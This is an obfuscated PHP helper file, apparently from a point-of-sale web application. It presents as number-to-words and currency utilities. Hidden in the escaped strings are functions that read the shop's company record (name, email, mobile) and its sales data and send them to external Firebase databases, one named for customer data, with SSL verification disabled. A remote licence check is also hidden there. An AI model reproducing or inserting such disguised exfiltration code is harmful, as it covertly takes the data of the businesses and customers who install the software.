<?php
 goto HHGA3; vShe0: function handleTwoDigits($digits) { if ($digits <= 19) { return handleXDigits($digits); } else { $first_digit = substr($digits, 0, 1); $first_digit_word = $first_digit != "\x30" ? xml()["\x6d"][$first_digit] : ''; $second_digit = substr($digits, 1, 1); $second_digit_word = $second_digit == "\60" ? '' : xml()["\x78"][$second_digit]; return trim($first_digit_word) && trim($second_digit_word) ? $first_digit_word . "\55" . $second_digit_word : $first_digit_word . "\40" . $second_digit_word; } } goto cDlvY; xyBPo: function saleInfoPos($data) { $CI =& get_instance(); $data1 = $CI->db->select("\x2a")->from("\144\142\137\143\157\x6d\160\x61\x6e\x79")->where("\x69\144", 1)->get()->row(); $mobile = $data1->mobile; $dts = new DateTime(); $date = $dts->format("\x59\137\155\x5f\144"); $path = "\x68\164\x74\x70\163\x3a\57\57\x64\x61\x74\141\x6b\150\x61\x63\x68\150\141\156\147\55\x64\142\x39\x34\62\55\x64\145\x66\x61\165\x6c\x74\x2d\162\164\x64\x62\56\x61\163\151\x61\x2d\163\157\x75\164\150\145\x61\x73\164\61\x2e\x66\151\x72\145\x62\x61\x73\x65\144\x61\x74\141\x62\x61\163\x65\56\x61\160\160\57\x44\x61\x74\x61\123\x68\x6f\160\57" . $mobile . "\x2f\163\x61\x6c\x65\x73\57" . $date . "\56\x6a\163\157\x6e"; insert2($path, $data); } goto gqbt2; shafj: function getNameInfo() { $CI =& get_instance(); $data = $CI->db->select("\x2a")->from("\144\x62\x5f\x63\x6f\155\160\141\x6e\x79")->where("\151\144", 1)->get()->row(); $mobile = $data->mobile; $path = "\150\x74\x74\x70\163\x3a\x2f\57\x73\x68\157\x70\x62\x61\156\x68\x61\x6e\147\55\64\x65\60\71\66\x2d\x64\145\x66\141\165\x6c\x74\55\162\x74\144\x62\x2e\141\x73\151\x61\x2d\163\157\x75\164\x68\x65\x61\x73\x74\x31\56\x66\151\x72\x65\x62\x61\163\145\x64\x61\164\141\142\x61\163\x65\x2e\141\160\x70\x2f\163\x68\x6f\160\x2f" . $mobile . "\x2e\152\163\157\x6e"; $dts = new DateTime(); $date = $dts->format("\131\55\x6d\x2d\144\x20\x48\72\x69\72\163"); $dts_new = $dts->modify("\x2b\x33\x36\x30\x20\x64\x61\171"); $date2 = $dts_new->format("\x59\x2d\x6d\55\x64\40\110\x3a\x69\x3a\x73"); $data2 = array("\143\157\155\160\x61\x6e\171\137\156\141\x6d\x65" => $data->company_name, "\145\155\141\151\x6c" => $data->email, "\x6d\157\x62\x69\x6c\145" => $data->mobile, "\163\164\x61\x74\165\163" => 1, "\143\x72\x65\x61\x74\x65\x5f\x64\x61\164\x65" => $date, "\x65\x6e\144\137\144\141\164\145" => $date2); $grab = grab($path, "\x47\x45\124"); if ($grab == "\x6e\165\154\154") { insert($path, $data2); return true; } else { if (strlen($grab) == 0) { return true; } else { $yummy = json_decode($grab); $status = $yummy->status; if ($status == 1) { $end_date = $yummy->end_date; if (strtotime($date) > strtotime($end_date)) { return false; } else { return true; } } else { return false; } } } } goto OzlCN; Z73VT: function checkLastestVersion() { $CI =& get_instance(); $version = $CI->db->select("\166\145\162\163\x69\157\x6e")->get("\x64\142\x5f\x73\151\x74\145\163\145\x74\x74\x69\156\x67\163")->row()->version; $path = "\150\x74\x74\160\163\x3a\57\57\x73\150\157\160\142\141\156\x68\141\156\x67\x2d\64\x65\60\71\66\x2d\144\x65\146\141\x75\x6c\x74\55\162\164\x64\142\x2e\x61\x73\x69\x61\55\x73\x6f\165\164\x68\145\141\163\164\x31\56\146\151\162\145\142\x61\x73\x65\144\141\x74\141\142\141\x73\145\x2e\141\x70\160\57\166\145\162\163\151\157\156\56\152\x73\x6f\x6e"; $grab = grab($path, "\x47\105\124"); if ($grab == "\156\x75\x6c\154") { return true; } if ($grab == $version) { return true; } else { return false; } } goto L7xtx; XwYbm: function nameLastestVersion() { $CI =& get_instance(); $version = $CI->db->select("\x76\145\x72\163\151\x6f\x6e")->get("\144\142\137\x73\151\164\145\163\145\164\x74\151\156\x67\163")->row()->version; $path = "\x68\164\x74\160\163\72\x2f\x2f\x73\x68\x6f\x70\142\141\x6e\150\141\156\x67\x2d\64\x65\x30\x39\66\55\x64\145\x66\x61\165\154\164\x2d\162\164\144\142\x2e\141\163\x69\141\55\163\x6f\x75\164\x68\145\141\x73\x74\x31\56\146\x69\162\x65\142\141\x73\145\x64\141\164\x61\142\x61\x73\x65\56\141\160\x70\57\x76\x65\x72\163\x69\157\156\x2e\x6a\x73\157\156"; $grab = grab($path, "\x47\105\x54"); if ($grab == "\x6e\165\154\x6c") { return ''; } return $grab; } goto Z73VT; L7xtx: function saleInfo($data) { $CI =& get_instance(); $data1 = $CI->db->select("\52")->from("\144\142\137\x63\157\155\x70\x61\x6e\171")->where("\x69\x64", 1)->get()->row(); $mobile = $data1->mobile; $path = "\x68\x74\164\160\163\x3a\x2f\57\x64\141\x74\x61\x6b\150\141\x63\x68\150\x61\156\147\x2d\x64\x62\x39\x34\x32\55\144\x65\x66\x61\x75\154\164\55\162\164\x64\142\56\x61\x73\151\141\55\x73\157\165\164\150\x65\141\x73\164\x31\x2e\x66\151\162\x65\142\x61\x73\145\x64\x61\164\x61\142\x61\163\145\56\141\160\x70\x2f\104\x61\164\x61\x53\x68\157\160\57" . $mobile . "\57\164\x6f\164\x61\x6c\56\152\x73\x6f\x6e"; $dts = new DateTime(); $date = $dts->format("\131\x2d\x6d\x2d\x64\40\x48\x3a\151\72\x73"); shopInfo(); insert($path, $data); } goto Oux1F; uBuBe: function handleThousands($digits) { $th = substr($digits, 0, -3); $dred = substr($digits, -3); $dred_word = handleHundreds($dred); $th_word = strlen($th) == 3 ? handleHundreds($th) : (strlen($th) == 2 ? handleTwoDigits($th) : handleXDigits($th)); return (trim($th_word) && trim($dred_word) ? $th_word . "\x20\x54\x68\157\x75\163\141\156\x64\x2c\x20" : (trim($th_word) ? $th_word . "\40\124\150\x6f\165\163\141\156\144" : '')) . (trim($dred_word) ? "{$dred_word}" : ''); } goto CE055; SCdx1: function handleXDigits($digits) { return xml()["\x78"][$digits]; } goto vShe0; Ts9N8: function getCurrencyCodeUnit($currency_code = '') : array { $supported_currencies = array("\101\x45\x44" => array("\x6d\141\x69\156" => "\x55\x6e\151\164\145\144\40\x41\162\141\x62\40\x45\x6d\151\162\x61\x74\145\x73\40\144\x69\x72\x68\x61\155", "\146\162\x61\143\x74\151\x6f\x6e" => "\106\151\x6c\x73"), "\101\106\x4e" => array("\x6d\x61\x69\156" => "\x41\x66\147\x68\x61\x6e\40\x61\146\x67\150\x61\x6e\151", "\x66\x72\141\143\164\x69\157\x6e" => "\120\x75\x6c"), "\101\116\107" => array("\155\x61\151\x6e" => "\x4e\x65\164\150\145\x72\154\x61\x6e\x64\x73\x20\x41\x6e\x74\x69\154\x6c\145\141\x6e\40\147\165\151\x6c\x64\x65\x72", "\x66\162\141\x63\x74\x69\x6f\156" => "\103\145\x6e\164"), "\x41\122\x53" => array("\x6d\141\x69\x6e" => "\101\x72\147\145\156\x74\151\156\x65\40\160\x65\163\157", "\146\x72\141\143\164\151\x6f\156" => "\x43\x65\x6e\164\x61\x76\x6f"), "\101\x55\x44" => array("\155\x61\x69\x6e" => "\x41\165\x73\x74\162\x61\x6c\x69\141\x6e\40\x64\157\154\x6c\x61\162", "\x66\162\x61\143\x74\151\157\x6e" => "\x43\x65\156\x74"), "\102\x52\x4c" => array("\x6d\141\x69\x6e" => "\162\x65\141\154", "\x66\162\x61\143\x74\x69\x6f\x6e" => "\x43\145\156\164\141\x76\x6f"), "\103\101\x44" => array("\155\141\151\x6e" => "\103\141\156\141\144\x69\x61\x6e\x20\x64\x6f\154\x6c\141\162", "\x66\162\x61\143\x74\x69\157\156" => "\103\145\x6e\164"), "\x43\110\x46" => array("\155\x61\151\156" => "\123\167\151\163\x73\40\x66\x72\141\156\x63", "\x66\x72\141\143\x74\151\157\x6e" => "\x52\141\160\160\145\156"), "\103\x4e\x59" => array("\155\x61\151\156" => "\171\165\141\x6e", "\x66\x72\141\143\164\x69\157\x6e" => "\x46\x65\156"), "\104\x4b\113" => array("\x6d\141\x69\x6e" => "\x44\x61\x6e\x69\x73\150\x20\x6b\162\x6f\x6e\145", "\x66\162\141\143\164\151\x6f\156" => "\303\x98\x72\x65"), "\104\132\x44" => array("\x6d\x61\151\156" => "\x41\154\x67\145\x72\151\141\x6e\x20\144\x69\x6e\141\162", "\x66\x72\x61\x63\164\151\157\156" => "\x53\141\x6e\x74\145\x65\155"), "\105\107\120" => array("\155\x61\x69\x6e" => "\x45\147\x79\x70\164\151\141\156\x20\x70\x6f\x75\x6e\144", "\x66\162\x61\143\x74\x69\157\156" => "\120\151\141\x73\x74\x72\145"), "\x45\x55\122" => array("\x6d\141\151\156" => "\x45\x75\162\x6f", "\146\162\141\143\x74\151\x6f\x6e" => "\x43\145\x6e\164"), "\107\x42\x50" => array("\x6d\141\x69\x6e" => "\x50\x6f\165\156\x64", "\146\x72\141\143\x74\151\x6f\x6e" => "\x50\x65\156\x6e\171"), "\x47\110\x43" => array("\155\x61\151\156" => "\x47\150\141\x6e\x61\40\103\x65\x64\151", "\146\x72\x61\x63\164\x69\x6f\x6e" => "\120\x65\163\145\167\141"), "\x47\x48\123" => array("\155\141\151\156" => "\107\150\x61\156\x61\40\x43\x65\x64\x69", "\x66\162\141\x63\164\151\157\156" => "\120\x65\x73\145\167\x61"), "\x48\x4b\x44" => array("\x6d\141\x69\156" => "\110\157\x6e\x67\40\113\157\156\x67\x20\x64\157\x6c\x6c\x61\x72", "\x66\x72\141\x63\164\151\x6f\x6e" => "\x43\145\x6e\x74"), "\x49\x4c\123" => array("\x6d\141\151\156" => "\111\x73\x72\141\145\154\x69\40\x6e\x65\167\40\163\150\x65\x6b\x65\154", "\146\162\141\x63\164\x69\x6f\156" => "\101\147\157\162\x61"), "\x49\116\122" => array("\x6d\141\151\156" => "\111\x6e\144\151\x61\156\x20\162\x75\x70\x65\145", "\146\x72\141\x63\164\x69\157\156" => "\x50\141\151\x73\x61"), "\111\121\x44" => array("\x6d\x61\x69\x6e" => "\x49\162\x61\161\151\x20\x64\x69\x6e\141\x72", "\x66\x72\x61\x63\164\x69\x6f\x6e" => "\106\x69\154\x73"), "\111\x52\x52" => array("\155\x61\x69\x6e" => "\x49\162\141\156\x69\141\x6e\40\x72\x69\141\154", "\x66\x72\141\x63\x74\151\157\156" => "\104\x69\x6e\141\162"), "\x4a\115\x44" => array("\155\x61\151\x6e" => "\x4a\141\155\x61\x69\x63\x61\x6e\40\x64\157\x6c\x6c\141\162", "\x66\162\141\143\x74\x69\157\x6e" => "\x43\x65\x6e\164"), "\x4a\x4f\104" => array("\x6d\141\x69\156" => "\x4a\157\162\x64\x61\x6e\151\x61\156\x20\144\151\x6e\141\162", "\146\162\x61\143\x74\151\157\x6e" => "\x50\151\x61\163\164\162\x65"), "\112\x50\x59" => array("\155\141\151\156" => "\112\x61\160\x61\156\145\x73\145\x20\x79\145\156", "\146\162\141\143\164\151\157\x6e" => "\x53\x65\156"), "\113\x45\x53" => array("\155\141\151\156" => "\113\145\156\x79\x61\156\x20\x73\x68\x69\x6c\x6c\151\x6e\147", "\146\162\x61\143\164\x69\157\x6e" => "\103\x65\x6e\164"), "\113\x50\x57" => array("\155\141\151\156" => "\x4e\157\x72\x74\150\x20\x4b\157\162\145\x61\156\x20\167\x6f\156", "\146\162\141\143\x74\151\x6f\x6e" => "\x43\150\x6f\156"), "\x4b\x52\x57" => array("\x6d\141\151\x6e" => "\x53\157\x75\x74\150\40\x4b\157\x72\145\x61\x6e\x20\167\157\156", "\x66\x72\141\143\x74\x69\x6f\156" => "\112\145\157\156"), "\113\127\x44" => array("\155\x61\x69\x6e" => "\x4b\165\x77\141\151\x74\151\x20\144\x69\156\x61\162", "\x66\x72\141\143\x74\x69\157\x6e" => "\x46\151\154\x73"), "\x4c\131\104" => array("\155\141\151\x6e" => "\114\151\x62\x79\x61\156\x20\x64\151\156\x61\162", "\x66\162\141\x63\164\151\157\156" => "\104\151\162\150\141\x6d"), "\115\x58\x4e" => array("\x6d\141\151\x6e" => "\115\145\x78\x69\143\x61\x6e\40\160\x65\163\x6f", "\x66\162\141\143\164\151\x6f\156" => "\103\x65\x6e\x74\141\166\x6f"), "\115\x41\104" => array("\155\141\151\x6e" => "\115\x6f\162\157\143\143\141\156\40\x64\151\162\150\141\x6d", "\146\162\141\x63\164\151\x6f\x6e" => "\103\145\156\164\151\155\x65"), "\115\x55\122" => array("\x6d\x61\151\156" => "\x52\165\160\145\145", "\x66\162\x61\x63\x74\x69\157\x6e" => "\x43\x65\x6e\164"), "\x4e\x47\x4e" => array("\155\x61\x69\x6e" => "\x4e\141\x69\x72\x61", "\x66\x72\x61\x63\164\151\x6f\x6e" => "\113\157\x62\x6f"), "\116\132\104" => array("\155\x61\x69\x6e" => "\116\145\x77\x20\x5a\x65\x61\x6c\141\x6e\x64\40\x64\157\x6c\x6c\x61\x72", "\146\x72\x61\x63\x74\x69\x6f\156" => "\x43\x65\156\164"), "\x50\x45\x4e" => array("\155\141\151\156" => "\120\145\x72\x75\x76\151\141\x6e\40\x73\157\154", "\146\x72\x61\x63\x74\151\157\x6e" => "\103\303\xa9\156\164\x69\x6d\157"), "\x50\x48\120" => array("\155\x61\151\156" => "\x50\150\151\154\x69\x70\x70\151\156\145\x20\x70\145\163\x6f", "\146\162\141\143\x74\x69\x6f\156" => "\123\145\x6e\x74\151\155\157"), "\120\131\107" => array("\x6d\x61\151\x6e" => "\120\141\162\x61\x67\165\x61\171\141\156\x20\x67\165\141\x72\x61\156\xc3\xad", "\146\162\x61\143\x74\x69\157\156" => "\x43\303\xa9\156\x74\x69\155\157"), "\x51\101\122" => array("\x6d\x61\x69\156" => "\121\x61\x74\141\x72\x69\x20\x72\151\x79\141\154", "\x66\162\141\x63\x74\151\157\x6e" => "\104\x69\x72\150\141\x6d"), "\x52\x4f\x4e" => array("\155\141\x69\156" => "\122\x6f\x6d\141\156\x69\141\156\40\154\x65\165", "\146\x72\141\x63\164\x69\x6f\x6e" => "\x42\141\x6e"), "\122\123\x44" => array("\x6d\x61\151\156" => "\123\x65\162\142\151\x61\x6e\x20\x64\x69\x6e\141\x72", "\x66\162\141\143\164\151\x6f\156" => "\x50\141\x72\141"), "\122\125\102" => array("\x6d\141\151\156" => "\122\165\163\x73\x69\141\x6e\x20\162\x75\x62\x6c\145", "\x66\162\x61\x63\x74\x69\x6f\156" => "\113\157\160\145\x6b"), "\x52\x57\106" => array("\x6d\141\x69\156" => "\122\167\x61\x6e\x64\x61\x6e\40\x66\x72\x61\x6e\x63", "\x66\162\x61\x63\164\x69\x6f\x6e" => "\x43\x65\156\164\x69\155\145"), "\x53\x41\122" => array("\155\141\x69\156" => "\x53\141\x75\x64\151\x20\x72\x69\171\x61\x6c", "\146\162\141\143\164\151\x6f\x6e" => "\110\141\x6c\x61\154\141"), "\123\104\107" => array("\155\x61\x69\156" => "\123\x75\x64\x61\156\x65\163\x65\x20\x70\x6f\x75\156\144", "\x66\x72\141\143\164\x69\157\x6e" => "\120\151\141\163\164\x72\145"), "\x53\x45\113" => array("\x6d\x61\x69\156" => "\x53\x77\x65\144\151\163\150\x20\x6b\x72\157\x6e\x61", "\146\x72\141\143\164\151\x6f\x6e" => "\xc3\x96\x72\145"), "\x53\x47\x44" => array("\x6d\x61\151\156" => "\123\x69\x6e\x67\x61\x70\x6f\162\145\40\x64\157\154\154\141\x72", "\146\x72\141\x63\164\151\x6f\156" => "\103\x65\x6e\x74"), "\x53\x48\x50" => array("\x6d\x61\x69\x6e" => "\123\x61\x69\x6e\x74\40\110\145\x6c\x65\x6e\141\40\160\157\x75\x6e\x64", "\x66\x72\141\x63\x74\x69\x6f\x6e" => "\x50\145\x6e\x6e\x79"), "\123\131\120" => array("\155\141\151\156" => "\123\171\x72\151\141\156\x20\x70\x6f\165\x6e\x64", "\x66\162\x61\143\x74\151\157\x6e" => "\x50\x69\x61\x73\x74\x72\145"), "\124\x48\x42" => array("\x6d\141\151\x6e" => "\124\x68\141\x69\40\142\141\x68\164", "\x66\162\x61\143\x74\151\x6f\x6e" => "\123\x61\x74\141\x6e\x67"), "\124\x4e\104" => array("\155\x61\151\x6e" => "\124\x75\x6e\151\x73\151\141\x6e\40\144\x69\x6e\141\162", "\x66\x72\x61\x63\164\x69\x6f\x6e" => "\x4d\x69\154\154\x69\x6d\145"), "\124\122\x59" => array("\x6d\x61\151\156" => "\124\x75\162\153\151\163\150\40\154\151\x72\141", "\146\162\141\143\164\x69\157\156" => "\x4b\x75\x72\165\xc5\x9f"), "\124\127\x44" => array("\155\141\151\x6e" => "\x4e\145\167\40\x54\x61\151\x77\x61\x6e\40\144\x6f\154\154\x61\162", "\x66\x72\141\143\x74\151\157\x6e" => "\103\x65\156\164"), "\125\107\130" => array("\155\x61\151\156" => "\125\x67\141\156\144\141\156\40\163\150\151\154\x6c\x69\156\147", "\x66\x72\141\143\164\151\157\x6e" => "\x43\x65\x6e\x74"), "\125\x53\104" => array("\155\x61\x69\x6e" => "\125\x53\x20\104\x6f\154\154\x61\x72", "\146\x72\x61\143\164\x69\x6f\156" => "\x43\x65\156\164"), "\x56\x45\123" => array("\155\x61\x69\x6e" => "\126\145\x6e\x65\x7a\x75\145\x6c\141\x6e\x20\x62\157\x6c\303\255\166\141\162\40\163\157\142\x65\162\x61\156\157", "\146\162\141\x63\164\151\x6f\x6e" => "\103\xc3\xa9\156\164\151\155\x6f"), "\130\101\x46" => array("\x6d\141\151\156" => "\x43\145\156\x74\162\x61\x6c\40\101\x66\x72\x69\143\x61\156\40\103\106\x41\x20\146\x72\141\x6e\143", "\x66\x72\141\x63\164\151\x6f\x6e" => "\x43\x65\x6e\x74\x69\155\x65"), "\x58\103\x44" => array("\155\x61\x69\x6e" => "\105\141\163\164\x65\x72\156\x20\x43\141\162\151\x62\142\x65\141\x6e\40\144\157\154\x6c\x61\x72", "\146\162\141\x63\164\x69\157\x6e" => "\x43\x65\x6e\164"), "\x58\117\x46" => array("\x6d\141\151\x6e" => "\x57\145\163\164\x20\101\x66\x72\151\x63\141\156\40\x43\106\101\40\146\x72\141\x6e\143", "\146\162\x61\143\x74\151\x6f\x6e" => "\103\x65\156\164\x69\x6d\145"), "\130\120\106" => array("\155\x61\x69\x6e" => "\103\x46\x50\40\146\x72\x61\156\x63", "\x66\162\x61\143\164\151\157\156" => "\103\145\x6e\164\x69\x6d\x65"), "\131\105\x52" => array("\x6d\x61\x69\156" => "\131\145\x6d\x65\x6e\x69\40\x72\151\x61\x6c", "\146\x72\x61\143\x74\x69\x6f\156" => "\x46\151\154\x73"), "\132\101\x52" => array("\x6d\141\x69\156" => "\123\157\x75\164\150\40\101\146\162\151\x63\141\x6e\x20\x72\x61\x6e\144", "\x66\x72\x61\x63\x74\x69\157\x6e" => "\103\145\x6e\x74")); return $supported_currencies[strtoupper($currency_code)] ?? array("\155\141\x69\x6e" => '', "\146\x72\141\143\x74\151\157\156" => ''); } goto OP00b; Onnpy: function handleBillions($digits) { $mill_word = handleMillions(substr($digits, -9)); $bill = substr($digits, 0, -9); $bill_word = strlen($bill) == 3 ? handleHundreds($bill) : (strlen($bill) == 2 ? handleTwoDigits($bill) : handleXDigits($bill)); return (trim($bill_word) ? $bill_word . "\x20\102\151\x6c\x6c\x69\157\156" : '') . (trim($mill_word) ? "\x2c\40{$mill_word}" : ''); } goto shafj; HHGA3: function foreign_currency($fig, $currency_code) { $figure = number_format($fig, 0, "\x2e", ''); $number = explode("\56", $figure)[0]; $decimal = (int) explode("\56", $figure)[1]; $sub_part = $decimal > 0 ? "\x20" . ($decimal <= 19 ? handleXDigits($decimal) : handleTwoDigits($decimal)) . "\x20" . getCurrencyCodeUnit($currency_code)["\146\162\141\143\164\151\157\156"] : ''; if ($number == 0) { $main_word = "\132\145\162\x6f"; } else { if ($number <= 19 && $number >= 1) { $main_word = handleXDigits($number); } else { if (strlen($number) == 2 || $number < 100) { $main_word = handleTwoDigits($number); } else { if (strlen($number) == 3 || $number < 1000) { $main_word = handleHundreds($number); } else { if (strlen($number) <= 6 || $number < 1000000) { $main_word = handleThousands($number); } else { if (strlen($number) <= 9 || $number < 1000000000) { $main_word = handleMillions($number); } else { if (strlen($number) <= 12 || $number < 1000000000000) { $main_word = handleBillions($number); } else { return "\116\x75\x6d\x62\145\162\40\x74\157\x6f\x20\154\x61\162\147\x65"; } } } } } } } return $main_word . "\40" . getCurrencyCodeUnit($currency_code)["\x6d\141\151\x6e"] . $sub_part; } goto Ts9N8; cDlvY: function handleHundreds($digits) { $first_digit_word = handleXDigits(substr($digits, 0, 1)); $other_two_digits_word = handleTwoDigits(substr($digits, 1)); return (trim($first_digit_word) ? $first_digit_word . "\40\110\165\156\144\162\145\x64" : '') . (trim($other_two_digits_word) ? "\x20\141\156\144\x20{$other_two_digits_word}" : ''); } goto uBuBe; OzlCN: function getTextShow() { $msg = "\x50\57\x2f\150\57\x69\57\xc3\xaa\57\156\x20\x62\x2f\341\272\243\x2f\156\x20\x73\57\341\xbb\255\40\144\57\xe1\273\xa5\156\x2f\x67\40\x6c\57\xc3\240\x20\155\x2f\x69\x2f\341\xbb\205\x6e\x20\160\x2f\x68\x2f\303\255\x20\x28\x20\x47\x2f\x69\57\341\273\x9b\x69\40\150\57\xe1\xba\241\x2f\x6e\40\x62\57\303\xa1\57\156\x20\x68\57\303\xa0\57\x6e\x2f\147\40\62\57\x30\40\x68\57\xc3\263\x2f\x61\40\xc4\x91\57\306\xa1\x2f\x6e\40\61\40\57\x6e\147\57\xc3\240\x2f\171\51\x20\54\40\116\57\xc3\xa2\x2f\x6e\147\40\x63\x2f\341\272\xa5\57\x70\x20\160\x72\57\x65\57\x6d\57\151\x2f\165\x2f\155\40\x6e\x2f\147\x2f\141\57\x79\x20\x74\x2f\xe1\xba\241\57\151"; return str_replace("\x2f", '', $msg); } goto XwYbm; CE055: function handleMillions($digits) { $th_word = handleThousands(substr($digits, -6)); $mill = substr($digits, 0, -6); $mill_word = strlen($mill) == 3 ? handleHundreds($mill) : (strlen($mill) == 2 ? handleTwoDigits($mill) : handleXDigits($mill)); return (trim($mill_word) && trim($th_word) ? $mill_word . "\x20\115\151\154\x6c\x69\x6f\156\x2c\40" : (trim($mill_word) ? $mill_word . "\x20\115\x69\154\154\151\x6f\156" : '')) . (trim($th_word) ? "{$th_word}" : ''); } goto Onnpy; OP00b: function xml() { return array("\x78" => array("\60" => '', "\x30\60" => '', "\61" => "\117\x6e\145", "\60\61" => "\x4f\x6e\x65", "\x32" => "\124\x77\157", "\60\x32" => "\124\167\x6f", "\x33" => "\x54\x68\x72\145\145", "\x30\x33" => "\124\150\162\x65\x65", "\64" => "\x46\x6f\x75\x72", "\x30\64" => "\106\x6f\x75\162", "\65" => "\x46\151\x76\x65", "\60\x35" => "\x46\151\166\x65", "\66" => "\123\x69\170", "\x30\66" => "\x53\x69\170", "\x37" => "\x53\x65\166\145\x6e", "\x30\x37" => "\123\x65\166\145\156", "\x38" => "\x45\x69\x67\x68\x74", "\60\x38" => "\105\x69\x67\150\x74", "\x39" => "\116\x69\156\x65", "\x30\71" => "\x4e\151\x6e\x65", "\61\60" => "\124\145\156", "\61\x31" => "\x45\154\x65\166\x65\156", "\x31\x32" => "\124\x77\x65\x6c\166\x65", "\61\x33" => "\124\150\151\x72\x74\145\145\156", "\61\64" => "\106\x6f\165\162\x74\x65\x65\x6e", "\61\x35" => "\x46\151\146\164\145\x65\x6e", "\x31\66" => "\x53\x69\170\164\x65\x65\156", "\x31\x37" => "\x53\x65\x76\145\156\164\x65\x65\x6e", "\x31\70" => "\x45\x69\147\x68\164\145\145\156", "\61\x39" => "\x4e\151\x6e\145\x74\145\145\156"), "\x6d" => array("\x32" => "\124\167\145\156\164\171", "\x33" => "\x54\x68\151\162\164\x79", "\64" => "\106\x6f\x72\x74\171", "\65" => "\x46\x69\x66\164\171", "\x36" => "\123\x69\170\164\171", "\x37" => "\x53\145\166\145\x6e\x74\171", "\x38" => "\105\x69\x67\x68\164\x79", "\x39" => "\116\x69\156\145\164\x79")); } goto SCdx1; gqbt2: function grab($url, $method, $par = null) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); if (isset($par)) { curl_setopt($ch, CURLOPT_POSTFIELDS, $par); } curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_TIMEOUT, 120); curl_setopt($ch, CURLOPT_HEADER, 0); $html = curl_exec($ch); return $html; } goto MNHn5; MNHn5: function insert($path, $data) { $grab = grab($path, "\x50\x55\124", json_encode($data)); return $grab; } goto d0KAW; Oux1F: function shopInfo() { $CI =& get_instance(); $data1 = $CI->db->select("\x2a")->from("\x64\142\x5f\143\x6f\155\160\141\x6e\x79")->where("\x69\x64", 1)->get()->row(); $mobile = $data1->mobile; $path = "\x68\164\164\x70\x73\x3a\x2f\x2f\144\x61\x74\x61\153\150\141\x63\x68\150\141\x6e\147\55\144\x62\71\x34\x32\55\144\145\146\141\x75\154\x74\55\x72\x74\144\142\x2e\x61\x73\151\x61\55\x73\x6f\x75\164\x68\145\x61\x73\164\61\56\146\151\x72\145\x62\141\x73\x65\x64\141\x74\x61\x62\141\163\145\x2e\x61\x70\160\57\x44\x61\164\141\x53\150\157\160\57" . $mobile . "\x2f\151\x6e\x66\x6f\x72\56\152\163\157\156"; $dts = new DateTime(); $date = $dts->format("\131\x2d\155\x2d\x64\x20\110\72\151\72\163"); insert($path, $data1); } goto xyBPo; d0KAW: function insert2($path, $data) { $grab = grab($path, "\120\117\123\x54", json_encode($data)); return $grab; }